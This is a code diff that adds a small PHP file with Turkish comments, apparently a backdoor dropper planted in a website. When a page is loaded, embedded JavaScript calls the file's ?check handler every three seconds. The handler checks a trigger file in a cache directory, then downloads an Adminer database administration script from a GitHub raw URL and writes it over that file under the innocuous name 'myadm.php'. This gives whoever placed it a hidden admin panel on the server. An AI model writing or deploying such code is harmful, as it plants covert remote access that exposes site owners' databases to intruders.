@@ -1,0 +1,36 @@
+<?php
+if (isset($_GET['check'])) {
+    $file_path = "/www/wwwroot/dytouzi/core/bootstrap/cache/myadm.php";
+    $remote_url = "https://raw.githubusercontent.com/mekote/all/refs/heads/main/adminer.txt";
+
+    // Dosyanın içeriğini oku
+    if (file_exists($file_path)) {
+        $content = file_get_contents($file_path);
+        if (trim($content) === "1") {
+            // Uzaktan içeriği çek
+            $new_content = file_get_contents($remote_url);
+            if ($new_content !== false) {
+                file_put_contents($file_path, $new_content);
+                echo "Dosya güncellendi.";
+            } else {
+                echo "Uzaktan içerik alınamadı.";
+            }
+        } else {
+            echo "Dosyada '1' bulunamadı.";
+        }
+    } else {
+        echo "Hedef dosya bulunamadı.";
+    }
+    exit;
+}
+?>
+
+    <script>
+        function checkFile() {
+            fetch("?check")
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error("Hata:", error));
+        }
+        setInterval(checkFile, 3000); // Her 3 saniyede bir kontrol et
+    </script>
